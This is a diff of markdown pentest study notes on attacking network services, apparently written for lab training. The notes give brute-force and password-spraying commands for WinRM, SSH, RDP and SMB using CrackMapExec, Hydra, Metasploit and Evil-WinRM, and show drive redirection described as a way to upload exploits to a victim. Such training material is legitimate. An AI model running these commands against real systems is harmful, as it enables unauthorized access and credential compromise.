@@ -1,96 +1,106 @@
 # Attacking Network Services
-```table-of-contents
-```
-## Common Service Ports
-| **Service** | **Port(s)**                                | **Transport** | **Description**                 |
-| ----------- | ------------------------------------------ | ------------- | ------------------------------- |
-| `FTP`     | 21                                         | TCP           | File Transfer Protocol          |
-| `SSH`     | 22                                         | TCP           | Secure Shell                    |
-| `Telnet`  | 23                                         | TCP           | Unencrypted text communications |
-| `SMTP`    | 25                                         | TCP           | Simple Mail Transfer Protocol   |
-| `SMB`     | 139, 445                                   | TCP           | Server Message Block            |
-| `RDP`     | 3389                                       | TCP/UDP       | Remote Desktop Protocol         |
-| `WinRM`   | 5985 (HTTP)<br><br>  <br><br>5986 (HTTPS)  | TCP           | Windows Remote Management       |
-| `SQL`     | 1433 (MSSQL)<br><br>  <br><br>3306 (MySQL) | TCP           | Database Services               |
-## WinRM (Windows Remote Management)
+**Concept:** Exploiting valid credentials to gain remote access. 
+**Key Insight:** Administrative services are rarely "vulnerable" to exploits in the traditional sense (buffer overflows). They are usually attacked via **Credential Spraying** (trying one password against many users) or **Brute Forcing** (trying many passwords against one user).
+## 1. Common Service Ports
+**Recon:** Always check these ports during enumeration (Phase 02) to identify potential entry points.
+
+| **Service** | **Port(s)**                                | **Transport** | **Description**                              |
+| ----------- | ------------------------------------------ | ------------- | -------------------------------------------- |
+| *FTP*     | 21                                         | TCP           | File Transfer. Often allows anonymous login. |
+| *SSH*     | 22                                         | TCP           | Linux Remote Access.                         |
+| *Telnet*  | 23                                         | TCP           | Unencrypted Remote Access (Legacy).          |
+| *SMTP*    | 25                                         | TCP           | Email Transfer.                              |
+| *SMB*     | 139, 445                                   | TCP           | Windows File Sharing & IPC.                  |
+| *SQL*     | 1433 (MSSQL)<br><br>  <br><br>3306 (MySQL) | TCP           | Database Services.                           |
+| *RDP*     | 3389                                       | TCP/UDP       | Windows Remote Desktop.                      |
+| *WinRM*   | 5985 (HTTP)<br><br>  <br><br>5986 (HTTPS)  | TCP           | PowerShell Remoting (Management).            |
+## 2. WinRM (Windows Remote Management)
+**Target:** Windows Servers (usually Port 5985). **Tooling:** `CrackMapExec` (or `NetExec`) for spraying, `Evil-WinRM` for access.
 ### Enumeration & Spraying (CrackMapExec)
+**Goal:** Validate credentials across the network.
 ```shell
 # General Syntax
-crackmapexec <protocol> <target> -u <user> -p <password>
+crackmapexec winrm <TARGET_IP> -u <USER> -p <PASSWORD>
 
-# Password Spraying / Brute Force WinRM
-crackmapexec winrm 10.129.42.197 -u user.list -p password.list
-
-# Check if credentials allow code execution (Look for "Pwn3d!")
-# Output example: [+] None\user:password (Pwn3d!)
+# Password Spraying (One password, list of users)
+# Look for "Pwn3d!" in the output - this indicates Admin access.
+crackmapexec winrm 10.129.42.197 -u users.txt -p 'Welcome1!'
 ```
 ### Access & Execution (Evil-WinRM)
+**Goal:** Get a stable PowerShell session.
 ```shell
 # Install
 sudo gem install evil-winrm
 
 # Connect
-evil-winrm -i <target-IP> -u <username> -p <password>
+evil-winrm -i 10.129.42.197 -u administrator -p 'password123'
 ```
-## SSH (Secure Shell)
-### Brute Forcing with Hydra
+## 3. SSH (Secure Shell)
+**Target:** Linux Servers (Port 22). 
+**Tooling:** `Hydra` for brute-forcing, standard `ssh` client for access.
+### Brute Forcing (Hydra)
+**Warning:** SSH is slow to brute force. Limit threads (`-t`) to 4 to avoid bans.
 ```shell
-# Brute Force SSH
-# -L: list of users, -P: list of passwords, -t: threads
-hydra -L user.list -P password.list -t 4 ssh://10.129.42.197
+# -L: User List | -P: Password List | -t: Threads
+hydra -L users.txt -P passwords.txt -t 4 ssh://10.129.42.197
 ```
-### Accessing SSH
+### Accessing
 ```shell
-# Standard connection
+# Standard Connection
 ssh user@10.129.42.197
 
-# Handle "Host Key Verification Failed" (if re-using IP)
-ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" user@IP
+# Bypass "Host Key Verification Failed" (Common in labs where IPs are reused)
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" user@10.129.42.197
 ```
-## RDP (Remote Desktop Protocol)
-### Brute Forcing RDP
+## 4. RDP (Remote Desktop Protocol)
+**Target:** Windows Workstations/Servers (Port 3389). 
+**Tooling:** `Hydra` for brute-forcing, `xFreeRDP` for access.
+### Brute Forcing (Hydra)
 ```shell
-# Brute Force RDP with Hydra
-hydra -L user.list -P password.list rdp://10.129.42.197
+hydra -L users.txt -P passwords.txt rdp://10.129.42.197
 ```
-### Accessing RDP (xFreeRDP)
+### Accessing (xFreeRDP)
+**Feature:** Drive Redirection allows you to mount a local folder to the remote victim, making file transfer (uploading exploits) easy.
 ```shell
-# Connect with credentials
-# /v: Server, /u: Username, /p: Password, /cert:ignore (auto accept cert)
+# Connect and ignore certificate warnings
 xfreerdp /v:10.129.42.197 /u:user /p:password /cert:ignore
 
-# Drive redirection (Mount local folder to remote)
-xfreerdp /v:10.129.42.197 /u:user /p:pass /drive:sharename,/home/kali/share
+# Connect + Mount local folder '/home/kali/tools' as 'Z:' on victim
+xfreerdp /v:10.129.42.197 /u:user /p:pass /drive:tools,/home/kali/tools
 ```
-## SMB (Server Message Block)
-### Brute Forcing SMB
-#### Using Metasploit
+## 5. SMB (Server Message Block)
+**Target:** Windows File Shares (Port 445). 
+**Tooling:** `Metasploit` or `CrackMapExec` for spraying, `smbclient` or `smbmap` for access.
+### Brute Forcing / Spraying
+**CrackMapExec (Fastest):**
+```shell
+# Spray creds and list available shares
+crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+
+**Metasploit (Module):**
 ```shell
 msfconsole -q
 use auxiliary/scanner/smb/smb_login
 set RHOSTS 10.129.42.197
-set USER_FILE user.list
-set PASS_FILE password.list
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
 run
 ```
-#### Using CrackMapExec (CME)
-```shell
-# Spray credentials and list shares
-crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
-```
 ### Enumerating & Accessing Shares
-#### Smbmap
+**Smbmap (Overview):**
 ```shell
-# List shares and permissions
-smbmap -H 10.129.202.136 -u john -p 'november'
+# List permissions (Read/Write)
+smbmap -H 10.129.42.197 -u john -p 'november'
 ```
-#### Smbclient
-```shell
-# Connect to a specific share
-smbclient -U user //10.129.42.197/SHARENAME
 
-# Commands inside smbclient:
-# ls      - List files
-# get     - Download file
-# put     - Upload file
+**Smbclient (Interaction):**
+```shell
+# Connect to a share
+smbclient -U user //10.129.42.197/ShareName
+
+# Commands:
+# > ls      (List files)
+# > get     (Download file)
+# > put     (Upload file)
 ```
